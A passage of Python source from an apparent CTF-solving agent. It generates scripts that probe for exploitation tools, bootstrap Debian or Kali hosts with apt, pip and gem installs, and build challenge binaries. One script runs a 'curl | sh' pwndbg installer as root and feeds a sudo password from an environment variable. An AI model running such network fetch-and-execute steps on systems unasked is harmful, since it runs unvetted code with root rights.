            ip_value = ipaddress.ip_address(host)
        except ValueError:
            if host.endswith(".local"):
                payload["is_reserved"] = True
            else:
                payload["is_public"] = True
            return payload

        payload["is_loopback"] = ip_value.is_loopback
        payload["is_private"] = ip_value.is_private
        payload["is_reserved"] = ip_value.is_reserved or ip_value.is_link_local or ip_value.is_multicast
        payload["is_public"] = not any(
            [
                payload["is_loopback"],
                payload["is_private"],
                payload["is_reserved"],
            ]
        )
        return payload

    def _python_bin(self, host):
        return str(host.get("python_bin") or self.DEFAULT_PYTHON)

    def _sanitize_run_id(self, run_id):
        text = str(run_id or uuid4().hex[:12]).strip()
        filtered = [ch if ch.isalnum() or ch in {"-", "_", "."} else "-" for ch in text]
        value = "".join(filtered).strip("-._")
        return value or uuid4().hex[:12]

    def _render_pwn_runtime_script(self, spec):
        spec = dict(spec or {})
        template = """\
#!/usr/bin/env python3
import json, os, platform, shutil, subprocess, sys, tempfile, urllib.request
from pathlib import Path
SPEC = __SPEC__
CORE = ["gdb", "patchelf", "checksec", "radare2", "pwntools", "angr", "r2pipe"]
ADV = ["gdbserver", "qemu_user", "pwninit", "one_gadget", "ropper"]
BUILD = ["gdb", "gcc", "gxx", "clang", "make", "cmake", "nasm", "multilib_32", "musl_tools", "qemu_user", "gdb_batch", "corefile", "pwndbg_or_gef", "rr"]
BUILD_CORE = ["gcc", "gxx", "make", "gdb"]
BUILD_READY = ["gcc", "gxx", "make", "gdb", "multilib_32", "pwndbg_or_gef", "rr"]
UBUNTU_FAMILY = {"ubuntu", "debian", "kali", "linuxmint", "pop", "neon", "parrot", "raspbian"}
PY_PKGS = list(SPEC.get("python_packages") or [])
APT_PKGS = list(SPEC.get("apt_packages") or [])
RUBY_GEMS = list(SPEC.get("ruby_gems") or [])
SUDO_PASSWORD = str(os.environ.get("CTF_AGENT_REMOTE_SUDO_PASSWORD") or "")

def run_capture(command, timeout=120, env=None, input_text=None):
    try:
        completed = subprocess.run(command, capture_output=True, text=True, timeout=timeout, env=env, input=input_text)
        return {"command": list(command), "returncode": completed.returncode, "stdout": (completed.stdout or "")[:12000], "stderr": (completed.stderr or "")[:8000]}
    except Exception as exc:
        return {"command": list(command), "returncode": -1, "stdout": "", "stderr": str(exc)}

def read_os_release():
    values = {}
    if not os.path.exists("/etc/os-release"):
        return values
    try:
        for raw in open("/etc/os-release", "r", encoding="utf-8", errors="replace"):
            line = raw.strip()
            if "=" not in line or line.startswith("#"):
                continue
            key, value = line.split("=", 1)
            values[key.strip().lower()] = value.strip().strip('"').strip("'")
    except Exception:
        return {}
    return values

def is_apt_compatible(profile):
    if profile.get("apt_get"):
        return True
    os_id = str(profile.get("os_id") or "").strip().lower()
    os_like = {token.strip().lower() for token in str(profile.get("os_like") or "").replace(",", " ").split() if token.strip()}
    return os_id in UBUNTU_FAMILY or bool(os_like.intersection(UBUNTU_FAMILY))

def is_kali_like(profile):
    os_id = str(profile.get("os_id") or "").strip().lower()
    os_like = {token.strip().lower() for token in str(profile.get("os_like") or "").replace(",", " ").split() if token.strip()}
    return os_id in {"kali", "parrot"} or bool(os_like.intersection({"kali", "parrot"}))

def suggested_bootstrap(profile):
    if not profile.get("apt_compatible"):
        return ""
    return "pwn-kali-bootstrap" if is_kali_like(profile) else "pwn-ubuntu-bootstrap"

def build_host_profile():
    os_release = read_os_release()
    profile = {"os_id": str(os_release.get("id") or "").strip().lower(), "os_like": str(os_release.get("id_like") or "").strip().lower(), "apt_get": bool(shutil.which("apt-get")), "apt_get_path": shutil.which("apt-get") or "", "python_bin": sys.executable, "platform": platform.platform(), "arch": platform.machine()}
    profile["apt_compatible"] = is_apt_compatible(profile)
    profile["kali_like"] = is_kali_like(profile)
    return profile

def collect_probe():
    sample_path = sys.argv[1] if len(sys.argv) > 1 else ""
    payload = {"status": "ok", "sample_path": sample_path, "tools": {}, "python_modules": {}, "host_profile": build_host_profile()}
    command_map = {"gdb":["gdb"],"gdbserver":["gdbserver"],"patchelf":["patchelf"],"checksec":["checksec"],"ropper":["ropper"],"one_gadget":["one_gadget"],"pwninit":["pwninit"],"radare2":["r2","radare2"],"tmux":["tmux"],"socat":["socat"],"qemu_user":["qemu-x86_64","qemu-aarch64","qemu-arm","qemu-mipsel","qemu-riscv64"],"gcc":["gcc"],"gxx":["g++"],"clang":["clang"],"make":["make"],"cmake":["cmake"],"nasm":["nasm"],"musl_tools":["musl-gcc","musl-clang"],"rr":["rr"]}
    for name, candidates in command_map.items():
        path = ""
        for candidate in candidates:
            path = shutil.which(candidate) or ""
            if path:
                break
        payload["tools"][name] = {"available": bool(path), "path": path, "detail": path}
    debugger_name = ""
    gdbinit_path = Path.home() / ".gdbinit"
    if gdbinit_path.exists():
        try:
            gdbinit_text = gdbinit_path.read_text(encoding="utf-8", errors="replace").lower()
            if "pwndbg" in gdbinit_text:
                debugger_name = "pwndbg"
            elif "gef" in gdbinit_text:
                debugger_name = "gef"
        except Exception:
            debugger_name = ""
    payload["tools"]["pwndbg_or_gef"] = {"available": bool(debugger_name), "path": "", "detail": debugger_name}
    multilib_ready = bool(os.path.exists("/usr/lib32/libc.so.6") or os.path.exists("/lib32/libc.so.6") or ("install ok installed" in (run_capture(["bash", "-lc", "dpkg-query -W -f='${Status}' gcc-multilib 2>/dev/null"], timeout=10).get("stdout") or "").lower()))
    payload["tools"]["multilib_32"] = {"available": multilib_ready, "path": "", "detail": "ready" if multilib_ready else ""}
    gdb_batch = run_capture(["gdb", "-q", "-batch", "-ex", "echo gdb-batch-ready\\n", "/bin/true"], timeout=20) if shutil.which("gdb") else {}
    gdb_batch_ready = bool(gdb_batch and gdb_batch.get("returncode") == 0 and "gdb-batch-ready" in ((gdb_batch.get("stdout") or "") + (gdb_batch.get("stderr") or "")))
    payload["tools"]["gdb_batch"] = {"available": gdb_batch_ready, "path": shutil.which("gdb") or "", "detail": ((gdb_batch.get("stdout") or "") + (gdb_batch.get("stderr") or "")).strip()[:200]}
    core_text = (run_capture(["bash", "-lc", "ulimit -c 2>/dev/null || printf 0"], timeout=8).get("stdout") or "").strip()
    payload["tools"]["corefile"] = {"available": core_text not in {"", "0"}, "path": "", "detail": core_text}
    for package_name, module_name, import_code in PY_PKGS:
        result = run_capture([sys.executable, "-c", import_code], timeout=20)
        payload["python_modules"][package_name] = {"available": result["returncode"] == 0, "detail": (result["stdout"] or result["stderr"]).strip()[:400], "module_name": module_name}
    matrix = {}
    for name, item in payload["tools"].items():
        matrix[name] = bool(item.get("available"))
    for package_name, item in payload["python_modules"].items():
        matrix[package_name] = bool(item.get("available"))
    matrix["pwndbg_or_gef"] = bool(payload["tools"]["pwndbg_or_gef"].get("detail"))
    matrix["libc_patch_tooling"] = bool(matrix.get("patchelf") or matrix.get("pwninit"))
    core_missing = [name for name in CORE if not matrix.get(name)]
    advanced_missing = [name for name in ADV if not matrix.get(name)]
    debugger_missing = [] if matrix.get("pwndbg_or_gef") else ["pwndbg_or_gef"]
    parity_profile = "weak" if core_missing else ("usable" if advanced_missing or debugger_missing else "ready")
    build_capabilities = {name: bool(matrix.get(name)) for name in BUILD}
    build_core_missing = [name for name in BUILD_CORE if not (build_capabilities.get(name) or matrix.get(name))]
    build_ready_missing = [name for name in BUILD_READY if not (build_capabilities.get(name) or matrix.get(name))]
    build_recommended = build_ready_missing + [name for name in ["clang", "cmake", "nasm", "musl_tools", "qemu_user", "corefile"] if not build_capabilities.get(name) and name not in build_ready_missing]
    build_profile = "weak" if parity_profile == "weak" or build_core_missing else ("usable" if build_ready_missing else "ready")
    recommended_templates = ["pwn-env-doctor", "binary-checksec", "pwntools-probe", "input-bruteforce-lite"]
    if matrix.get("gdbserver"): recommended_templates.append("pwn-gdbserver-launch")
    if matrix.get("qemu_user"): recommended_templates.append("pwn-qemu-run")
    if matrix.get("libc_patch_tooling"): recommended_templates.append("pwn-libc-setup")
    if matrix.get("pwninit"): recommended_templates.append("pwninit-bootstrap")
    if matrix.get("one_gadget"): recommended_templates.append("one-gadget-check")
    if matrix.get("gcc") and matrix.get("make"): recommended_templates.extend(["pwn-build-native", "pwn-libc-ident", "pwn-regress-build-pack"])
    if matrix.get("multilib_32"): recommended_templates.append("pwn-build-multilib")
    if matrix.get("gdb_batch"): recommended_templates.append("pwn-gdb-batch-trace")
    if matrix.get("corefile"): recommended_templates.append("pwn-corefile-collect")
    payload.update({"pwndbg_or_gef": matrix.get("pwndbg_or_gef", False), "libc_patch_tooling": matrix.get("libc_patch_tooling", False), "missing": core_missing + advanced_missing, "recommended_templates": list(dict.fromkeys(recommended_templates)), "parity_profile": parity_profile, "core_missing": core_missing, "advanced_missing": advanced_missing, "debugger_missing": debugger_missing, "build_capabilities": build_capabilities, "build_profile": build_profile, "build_missing": build_core_missing + [name for name in build_ready_missing if name not in build_core_missing], "build_recommended": build_recommended, "bootstrap_recommended": bool(payload["host_profile"].get("apt_compatible") and (parity_profile != "ready" or build_profile != "ready")), "suggested_template": suggested_bootstrap(payload["host_profile"]) if payload["host_profile"].get("apt_compatible") and (parity_profile != "ready" or build_profile != "ready") else "", "suggested_build_template": ("pwn-build-multilib" if build_capabilities.get("multilib_32") else "pwn-build-native")})
    if payload["build_profile"] == "weak" and payload["host_profile"].get("apt_compatible"):
        payload["suggested_build_template"] = suggested_bootstrap(payload["host_profile"])
    if sample_path and os.path.exists(sample_path):
        sample_checksec = {}
        if shutil.which("checksec"):
            sample_checksec = run_capture(["checksec", "--file", sample_path], timeout=10)
            sample_checksec_text = ((sample_checksec.get("stdout") or "") + "\\n" + (sample_checksec.get("stderr") or "")).lower()
            if "unknown option file" in sample_checksec_text or "no option selected" in sample_checksec_text:
                sample_checksec = run_capture(["checksec", "--file=" + sample_path], timeout=10)
                sample_checksec_text = ((sample_checksec.get("stdout") or "") + "\\n" + (sample_checksec.get("stderr") or "")).lower()
                if "unknown option file" in sample_checksec_text or "no option selected" in sample_checksec_text:
                    sample_checksec = run_capture(["checksec", sample_path], timeout=10)
        payload["sample"] = {"exists": True, "file": run_capture(["file", sample_path], timeout=10) if shutil.which("file") else {}, "checksec": sample_checksec}
    else:
        payload["sample"] = {"exists": False}
    return payload

def package_installed(name):
    result = run_capture(["bash", "-lc", "dpkg-query -W -f='${Status}' " + name + " 2>/dev/null"], timeout=10)
    return result.get("returncode") == 0 and "install ok installed" in (result.get("stdout") or "").lower()

def command_with_optional_sudo(command):
    if os.geteuid() == 0 or not shutil.which("sudo"):
        return list(command)
    if SUDO_PASSWORD:
        return ["sudo", "-S", "-p", ""] + list(command)
    return ["sudo"] + list(command)

def run_with_optional_sudo(command, timeout=120, env=None):
    if os.geteuid() == 0 or not shutil.which("sudo"):
        return run_capture(command, timeout=timeout, env=env)
    input_text = (SUDO_PASSWORD + "\\n") if SUDO_PASSWORD else None
    return run_capture(command_with_optional_sudo(command), timeout=timeout, env=env, input_text=input_text)

def record_failure(payload, step, result, warning_message=""):
    payload["failed_steps"].append({"step": step, "command": list(result.get("command") or []), "returncode": result.get("returncode"), "stdout": result.get("stdout", ""), "stderr": result.get("stderr", "")})
    if warning_message:
        payload["warnings"].append(warning_message)

def apt_result_looks_broken(result):
    combined = ((result.get("stdout") or "") + "\\n" + (result.get("stderr") or "")).lower()
    return any(token in combined for token in ["fix-broken install", "unmet dependencies", "not fully installed or removed"])

def fix_broken_apt(payload, step_name="apt-fix-broken"):
    repair = run_with_optional_sudo(["apt-get", "--fix-broken", "install", "-y"], timeout=3600)
    if repair["returncode"] == 0:
        if "apt:fix-broken" not in payload["installed"]:
            payload["installed"].append("apt:fix-broken")
        return True
    repair_text = ((repair.get("stdout") or "") + "\\n" + (repair.get("stderr") or "")).lower()
    if "trying to overwrite" in repair_text:
        forced = run_with_optional_sudo(["apt-get", "-o", "Dpkg::Options::=--force-overwrite", "--fix-broken", "install", "-y"], timeout=3600)
        if forced["returncode"] == 0:
            if "apt:fix-broken" not in payload["installed"]:
                payload["installed"].append("apt:fix-broken")
            payload["warnings"].append("apt fix-broken required --force-overwrite during package transition")
            return True
        record_failure(payload, step_name + "-force-overwrite", forced, "apt broken-state repair failed even with force-overwrite")
        return False
    record_failure(payload, step_name, repair, "apt broken-state repair failed")
    return False

def install_python_packages(payload, missing_python):
    packages = [str(name) for name in list(missing_python or []) if str(name).strip()]
    if not packages:
        return True
    pip_install = run_capture([sys.executable, "-m", "pip", "install", "--default-timeout", "240", "--upgrade"] + packages, timeout=2400)
    if pip_install["returncode"] == 0:
        payload["installed"].extend(["pip:{0}".format(name) for name in packages])
        return True
    pip_text = ((pip_install.get("stdout") or "") + "\\n" + (pip_install.get("stderr") or "")).lower()
    if "externally-managed-environment" in pip_text:
        fallback = run_capture([sys.executable, "-m", "pip", "install", "--user", "--break-system-packages", "--default-timeout", "240", "--upgrade"] + packages, timeout=2400)
        if fallback["returncode"] == 0:
            payload["installed"].extend(["pip:{0}".format(name) for name in packages])
            payload["warnings"].append("python packages installed with --user --break-system-packages fallback")
            return True
        record_failure(payload, "python-packages", fallback, "python package install failed after PEP 668 fallback")
        return False
    record_failure(payload, "python-packages", pip_install, "python package install failed")
    return False

def install_pwninit(payload):
    if shutil.which("pwninit"):
        payload["skipped"].append("binary:pwninit"); return
    api_url = "https://api.github.com/repos/io12/pwninit/releases/latest"
    arch = platform.machine().lower()
    arch_tokens = {"x86_64":["x86_64","amd64"],"amd64":["x86_64","amd64"],"aarch64":["aarch64","arm64"],"arm64":["aarch64","arm64"]}.get(arch, [arch])
    try:
        with urllib.request.urlopen(urllib.request.Request(api_url, headers={"User-Agent": "ctf-agent-bootstrap/1.0"}), timeout=20) as response:
            release = json.load(response)
    except Exception as exc:
        payload["warnings"].append("pwninit latest release lookup failed: {0}".format(exc)); payload["failed_steps"].append({"step": "pwninit", "command": [api_url], "returncode": -1, "stdout": "", "stderr": str(exc)}); return
    chosen = None
    for token in arch_tokens:
        for asset in list(release.get("assets") or []):
            name = str(asset.get("name") or "").lower()
            if token in name and ("linux" in name or "musl" in name or name.startswith("pwninit")):
                chosen = asset; break
        if chosen: break
    if not chosen:
        for asset in list(release.get("assets") or []):
            name = str(asset.get("name") or "").lower()
            if name == "pwninit" or name.startswith("pwninit-"):
                chosen = asset
                break
    if not chosen:
        payload["warnings"].append("pwninit latest release does not expose a compatible Linux asset"); payload["failed_steps"].append({"step": "pwninit", "command": [api_url], "returncode": -1, "stdout": "", "stderr": "compatible asset not found"}); return
    temp_path = ""
    try:
        with urllib.request.urlopen(urllib.request.Request(str(chosen.get("browser_download_url") or "").strip(), headers={"User-Agent": "ctf-agent-bootstrap/1.0"}), timeout=30) as response:
            blob = response.read()
        with tempfile.NamedTemporaryFile(prefix="ctf-agent-pwninit-", delete=False) as handle:
            handle.write(blob); temp_path = handle.name
        os.chmod(temp_path, 0o755)
        result = run_with_optional_sudo(["install", "-m", "0755", temp_path, "/usr/local/bin/pwninit"], timeout=40)
        if result["returncode"] == 0: payload["installed"].append("binary:pwninit")
        else: record_failure(payload, "pwninit", result, "pwninit install failed; continuing without hard failure")
    except Exception as exc:
        payload["warnings"].append("pwninit download/install failed: {0}".format(exc)); payload["failed_steps"].append({"step": "pwninit", "command": [str(chosen.get("browser_download_url") or "").strip()], "returncode": -1, "stdout": "", "stderr": str(exc)})
    finally:
        if temp_path and os.path.exists(temp_path):
            try: os.remove(temp_path)
            except Exception: pass

def install_pwndbg(payload):
    gdbinit_path = Path.home() / ".gdbinit"
    existing_text = gdbinit_path.read_text(encoding="utf-8", errors="replace") if gdbinit_path.exists() else ""
    lowered = existing_text.lower()
    if "pwndbg" in lowered or "gef" in lowered:
        payload["skipped"].append("pwndbg"); return
    result = run_with_optional_sudo(["bash", "-lc", "curl -qsL https://install.pwndbg.re | sh -s -- -t pwndbg-gdb"], timeout=600)
    if result["returncode"] != 0:
        record_failure(payload, "pwndbg", result, "pwndbg install failed; attempting gef fallback")
        install_gef_fallback(payload)
        return
    source_line = ""
    try:
        for raw in gdbinit_path.read_text(encoding="utf-8", errors="replace").splitlines():
            line = raw.strip()
            if line.startswith("source ") and ("pwndbg" in line.lower() or "gdbinit.py" in line.lower()):
                source_line = line; break
    except Exception:
        source_line = ""
    if existing_text and source_line and source_line not in existing_text:
        guard = "# >>> ctf-agent pwndbg >>>\\n{0}\\n# <<< ctf-agent pwndbg <<<\\n".format(source_line)
        try: gdbinit_path.write_text(existing_text.rstrip() + "\\n\\n" + guard, encoding="utf-8")
        except Exception as exc: payload["warnings"].append("pwndbg merge warning: {0}".format(exc))
    elif existing_text and not source_line:
        payload["warnings"].append("pwndbg installer completed but no source line was found for guarded merge")
        try: gdbinit_path.write_text(existing_text, encoding="utf-8")
        except Exception: pass
    payload["installed"].append("pwndbg")

def install_gef_fallback(payload):
    gdbinit_path = Path.home() / ".gdbinit"
    existing_text = gdbinit_path.read_text(encoding="utf-8", errors="replace") if gdbinit_path.exists() else ""
    lowered = existing_text.lower()
    if "gef" in lowered:
        payload["skipped"].append("gef")
        return
    gef_url = "https://raw.githubusercontent.com/hugsy/gef/main/gef.py"
    gef_path = Path.home() / ".gef.py"
    try:
        with urllib.request.urlopen(urllib.request.Request(gef_url, headers={"User-Agent": "ctf-agent-bootstrap/1.0"}), timeout=30) as response:
            gef_path.write_bytes(response.read())
        source_line = "source {0}".format(str(gef_path))
        if source_line not in existing_text:
            guard = "# >>> ctf-agent gef >>>\\n{0}\\n# <<< ctf-agent gef <<<\\n".format(source_line)
            merged = existing_text.rstrip() + ("\\n\\n" if existing_text.strip() else "") + guard
            gdbinit_path.write_text(merged, encoding="utf-8")
        payload["installed"].append("gef")
        payload["warnings"].append("pwndbg install failed; installed gef fallback")
    except Exception as exc:
        payload["warnings"].append("gef fallback install failed: {0}".format(exc))
        payload["failed_steps"].append({"step": "gef-fallback", "command": [gef_url], "returncode": -1, "stdout": "", "stderr": str(exc)})

def repair_kali_archive_keyring(payload):
    keyring_url = "https://archive.kali.org/archive-keyring.gpg"
    target_path = "/usr/share/keyrings/kali-archive-keyring.gpg"
    temp_path = ""
    try:
        with urllib.request.urlopen(urllib.request.Request(keyring_url, headers={"User-Agent": "ctf-agent-bootstrap/1.0"}), timeout=30) as response:
            blob = response.read()
        with tempfile.NamedTemporaryFile(prefix="ctf-agent-kali-keyring-", delete=False) as handle:
            handle.write(blob)
            temp_path = handle.name
        result = run_with_optional_sudo(["install", "-m", "0644", temp_path, target_path], timeout=60)
        if result["returncode"] == 0:
            payload["installed"].append("kali-archive-keyring")
            return True
        record_failure(payload, "kali-archive-keyring", result, "kali archive keyring repair failed")
        return False
    except Exception as exc:
        payload["warnings"].append("kali archive keyring repair failed: {0}".format(exc))
        payload["failed_steps"].append({"step": "kali-archive-keyring", "command": [keyring_url], "returncode": -1, "stdout": "", "stderr": str(exc)})
        return False
    finally:
        if temp_path and os.path.exists(temp_path):
            try: os.remove(temp_path)
            except Exception: pass

if not SPEC.get("bootstrap"):
    print(json.dumps(collect_probe(), ensure_ascii=False, indent=2)); raise SystemExit(0)

payload = {"status": "warn", "installed": [], "skipped": [], "warnings": [], "failed_steps": [], "final_probe": {}, "final_build_profile": ""}
host_profile = build_host_profile(); payload["host_profile"] = host_profile
if not host_profile.get("apt_compatible"):
    payload["status"] = "unsupported"; payload["warnings"].append("host is not Debian/Kali-like or apt-get is unavailable"); payload["final_probe"] = collect_probe(); payload["final_build_profile"] = str(payload["final_probe"].get("build_profile") or "weak"); print(json.dumps(payload, ensure_ascii=False, indent=2)); raise SystemExit(0)
apt_update = run_with_optional_sudo(["apt-get", "update"], timeout=300)
apt_update_text = (apt_update.get("stdout") or "") + "\\n" + (apt_update.get("stderr") or "")
if apt_update["returncode"] != 0 and host_profile.get("kali_like") and "NO_PUBKEY" in apt_update_text:
    if repair_kali_archive_keyring(payload):
        apt_update = run_with_optional_sudo(["apt-get", "update"], timeout=300)
if apt_update["returncode"] == 0: payload["installed"].append("apt-get-update")
else: record_failure(payload, "apt-get-update", apt_update, "apt-get update failed")
apt_check = run_with_optional_sudo(["apt-get", "check"], timeout=300)
if apt_check["returncode"] != 0 and apt_result_looks_broken(apt_check):
    fix_broken_apt(payload)
missing_apt = [name for name in APT_PKGS if not package_installed(name)]
for name in APT_PKGS:
    if name not in missing_apt: payload["skipped"].append("apt:{0}".format(name))
if missing_apt:
    apt_install = run_with_optional_sudo(["apt-get", "install", "-y"] + missing_apt, timeout=1800)
    if apt_install["returncode"] != 0 and apt_result_looks_broken(apt_install) and fix_broken_apt(payload, "apt-packages-fix-broken"):
        remaining_apt = [name for name in missing_apt if not package_installed(name)]
        if remaining_apt:
            apt_install = run_with_optional_sudo(["apt-get", "install", "-y"] + remaining_apt, timeout=1800)
    if apt_install["returncode"] == 0:
        payload["installed"].extend(["apt:{0}".format(name) for name in missing_apt if package_installed(name)])
    else:
        record_failure(payload, "apt-packages", apt_install, "bulk apt package install failed; retrying package-by-package")
        for name in missing_apt:
            if package_installed(name):
                if "apt:{0}".format(name) not in payload["installed"]:
                    payload["installed"].append("apt:{0}".format(name))
                continue
            single_install = run_with_optional_sudo(["apt-get", "install", "-y", name], timeout=600)
            if single_install["returncode"] != 0 and apt_result_looks_broken(single_install) and fix_broken_apt(payload, "apt:{0}:fix-broken".format(name)):
                single_install = run_with_optional_sudo(["apt-get", "install", "-y", name], timeout=600)
            if single_install["returncode"] == 0:
                payload["installed"].append("apt:{0}".format(name))
            else:
                record_failure(payload, "apt:{0}".format(name), single_install, "apt package install failed: {0}".format(name))
missing_python = []
for package_name, module_name, import_code in PY_PKGS:
    result = run_capture([sys.executable, "-c", import_code], timeout=20)
    if result["returncode"] == 0: payload["skipped"].append("pip:{0}".format(package_name))
    else: missing_python.append(package_name)
if missing_python:
    install_python_packages(payload, missing_python)
for gem_name in RUBY_GEMS:
    if shutil.which(gem_name): payload["skipped"].append("gem:{0}".format(gem_name))
    else:
        gem_install = run_with_optional_sudo(["gem", "install", gem_name, "--no-document"], timeout=1200)
        if gem_install["returncode"] == 0: payload["installed"].append("gem:{0}".format(gem_name))
        else: record_failure(payload, gem_name, gem_install, "{0} gem install failed".format(gem_name))
install_pwninit(payload); install_pwndbg(payload)
payload["final_probe"] = collect_probe(); payload["final_build_profile"] = str(payload["final_probe"].get("build_profile") or "weak")
final_parity = str(payload["final_probe"].get("parity_profile") or "weak")
payload["status"] = "ok" if final_parity == "ready" and payload["final_build_profile"] == "ready" and not payload["failed_steps"] and not payload["warnings"] else "warn"
print(json.dumps(payload, ensure_ascii=False, indent=2))
"""
        return textwrap.dedent(template).replace("__SPEC__", repr(spec), 1)

    def _render_pwn_env_doctor_template(self):
        return self._render_pwn_runtime_script(
            {
                "bootstrap": False,
                "python_packages": [
                    ("pwntools", "pwn", "import pwn; print(getattr(pwn, '__file__', 'ok'))"),
                    ("angr", "angr", "import angr; print(getattr(angr, '__file__', 'ok'))"),
                    ("r2pipe", "r2pipe", "import r2pipe; print(getattr(r2pipe, '__file__', 'ok'))"),
                    ("ropper", "ropper", "import ropper; print(getattr(ropper, '__file__', 'ok'))"),
                ],
            }
        )

    def _render_pwn_ubuntu_bootstrap_template(self):
        return self._render_pwn_runtime_script(
            {
                "bootstrap": True,
                "apt_packages": [
                    "gdb",
                    "gdbserver",
                    "gdb-multiarch",
                    "patchelf",
                    "socat",
                    "tmux",
                    "qemu-user",
                    "qemu-user-static",
                    "ruby-full",
                    "python3",
                    "python3-pip",
                    "python3-venv",
                    "build-essential",
                    "git",
                    "curl",
                    "file",
                    "unzip",
                    "binutils",
                    "checksec",
                    "radare2",
                ],
                "python_packages": [
                    ("pwntools", "pwn", "import pwn; print(getattr(pwn, '__file__', 'ok'))"),
                    ("angr", "angr", "import angr; print(getattr(angr, '__file__', 'ok'))"),
                    ("r2pipe", "r2pipe", "import r2pipe; print(getattr(r2pipe, '__file__', 'ok'))"),
                    ("ropper", "ropper", "import ropper; print(getattr(ropper, '__file__', 'ok'))"),
                ],
                "ruby_gems": ["one_gadget"],
            }
        )

    def _render_pwn_kali_bootstrap_template(self):
        return self._render_pwn_runtime_script(
            {
                "bootstrap": True,
                "apt_packages": [
                    "openssh-server",
                    "build-essential",
                    "gcc",
                    "g++",
                    "gcc-multilib",
                    "g++-multilib",
                    "clang",
                    "lld",
                "gdb",
                "gdbserver",
                "gdb-multiarch",
                "rr",
                "make",
                "cmake",
                "nasm",
                    "patchelf",
                    "binutils",
                    "libc6-dev",
                    "libc6-dev-i386",
                    "musl-tools",
                    "qemu-user",
                    "qemu-user-static",
                    "ruby-full",
                    "python3",
                    "python3-pip",
                    "python3-venv",
                    "git",
                    "curl",
                    "file",
                    "unzip",
                    "tmux",
                    "socat",
                    "radare2",
                    "checksec",
                ],
                "python_packages": [
                    ("pwntools", "pwn", "import pwn; print(getattr(pwn, '__file__', 'ok'))"),
                    ("angr", "angr", "import angr; print(getattr(angr, '__file__', 'ok'))"),
                    ("r2pipe", "r2pipe", "import r2pipe; print(getattr(r2pipe, '__file__', 'ok'))"),
                    ("ropper", "ropper", "import ropper; print(getattr(ropper, '__file__', 'ok'))"),
                    ("capstone", "capstone", "import capstone; print(getattr(capstone, '__file__', 'ok'))"),
                    ("unicorn", "unicorn", "import unicorn; print(getattr(unicorn, '__file__', 'ok'))"),
                    ("keystone-engine", "keystone", "import keystone; print(getattr(keystone, '__file__', 'ok'))"),
                    ("z3-solver", "z3", "import z3; print(getattr(z3, '__file__', 'ok'))"),
                ],
                "ruby_gems": ["one_gadget"],
            }
        )

    def _render_pwn_build_template(self, mode):
        template = """\
#!/usr/bin/env python3
import glob, json, os, shutil, subprocess, sys
MODE = __MODE__
spec = json.loads(sys.argv[1] or "{}")
source_dir = str(spec.get("source_dir") or os.getcwd())
build_dir = str(spec.get("build_dir") or os.path.join(source_dir, "build"))
binary_name = str(spec.get("binary_name") or ("chall32" if MODE == "multilib" else "chall"))
provided_sources = [str(item) for item in list(spec.get("sources") or []) if str(item)]
cflags = [str(item) for item in list(spec.get("cflags") or []) if str(item)]
ldflags = [str(item) for item in list(spec.get("ldflags") or []) if str(item)]

def run_capture(command, timeout=300, env=None, cwd=None):
    try:
        completed = subprocess.run(command, capture_output=True, text=True, timeout=timeout, env=env, cwd=cwd)
        return {"command": list(command), "returncode": completed.returncode, "stdout": (completed.stdout or "")[:16000], "stderr": (completed.stderr or "")[:10000]}
    except Exception as exc:
        return {"command": list(command), "returncode": -1, "stdout": "", "stderr": str(exc)}

def run_checksec(path, timeout=20):
    if not shutil.which("checksec"):
        return {}
    result = run_capture(["checksec", "--file", path], timeout=timeout)
    text = ((result.get("stdout") or "") + "\\n" + (result.get("stderr") or "")).lower()
    if "unknown option file" in text or "no option selected" in text:
        result = run_capture(["checksec", "--file=" + path], timeout=timeout)
        text = ((result.get("stdout") or "") + "\\n" + (result.get("stderr") or "")).lower()
        if "unknown option file" in text or "no option selected" in text:
            result = run_capture(["checksec", path], timeout=timeout)
    return result

def discover_sources():
    if provided_sources:
        return provided_sources
    items = []
    for pattern in ["*.c", "*.cc", "*.cpp", "*.cxx", "*.S", "*.s", "*.asm"]:
        items.extend(sorted(glob.glob(os.path.join(source_dir, pattern))))
    return [os.path.abspath(item) for item in items]

def locate_binary():
    candidates = [os.path.join(build_dir, binary_name), os.path.join(source_dir, binary_name)]
    for root in [build_dir, source_dir]:
        if not os.path.isdir(root):
            continue
        for name in sorted(os.listdir(root)):
            path = os.path.join(root, name)
            if not os.path.isfile(path):
                continue
            lower = name.lower()
            if lower.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".s", ".asm", ".o", ".json", ".md", ".txt")):
                continue
            if os.access(path, os.X_OK):
                candidates.append(path)
    seen = set()
    for item in candidates:
        marker = os.path.abspath(item)
        if marker in seen or not os.path.isfile(marker):
            continue
        seen.add(marker)
        return marker
    return ""

payload = {"status": "error", "mode": MODE, "source_dir": source_dir, "build_dir": build_dir, "binary_name": binary_name, "sources": discover_sources(), "compile_strategy": "", "steps": [], "selected_binary": ""}
os.makedirs(build_dir, exist_ok=True)
if not payload["sources"] and not os.path.exists(os.path.join(source_dir, "Makefile")) and not os.path.exists(os.path.join(source_dir, "CMakeLists.txt")):
    payload["message"] = "no buildable sources, Makefile, or CMakeLists.txt were found"
    print(json.dumps(payload, ensure_ascii=False, indent=2))
    raise SystemExit(0)
env = dict(os.environ)
if MODE == "multilib":
    cflags += ["-m32"]
    ldflags += ["-m32"]
    env["CFLAGS"] = (env.get("CFLAGS", "") + " -m32").strip()
    env["CXXFLAGS"] = (env.get("CXXFLAGS", "") + " -m32").strip()
    env["LDFLAGS"] = (env.get("LDFLAGS", "") + " -m32").strip()
if os.path.exists(os.path.join(source_dir, "CMakeLists.txt")) and shutil.which("cmake"):
    payload["compile_strategy"] = "cmake"
    configure = ["cmake", "-S", source_dir, "-B", build_dir]
    if MODE == "multilib":
        configure.extend(["-DCMAKE_C_FLAGS=-m32", "-DCMAKE_CXX_FLAGS=-m32", "-DCMAKE_EXE_LINKER_FLAGS=-m32"])
    payload["steps"].append(run_capture(configure, timeout=600, env=env))
    if payload["steps"][-1]["returncode"] == 0:
        payload["steps"].append(run_capture(["cmake", "--build", build_dir, "-j"], timeout=900, env=env))
elif os.path.exists(os.path.join(source_dir, "Makefile")) and shutil.which("make"):
    payload["compile_strategy"] = "make"
    payload["steps"].append(run_capture(["make", "-C", source_dir], timeout=900, env=env))
else:
    c_like = [item for item in payload["sources"] if item.lower().endswith((".c", ".s", ".S"))]
    cpp_like = [item for item in payload["sources"] if item.lower().endswith((".cc", ".cpp", ".cxx"))]
    asm_like = [item for item in payload["sources"] if item.lower().endswith(".asm")]
    objects = []
    if asm_like:
        if not shutil.which("nasm"):
            payload["message"] = "nasm is required for .asm sources"
            print(json.dumps(payload, ensure_ascii=False, indent=2))
            raise SystemExit(0)
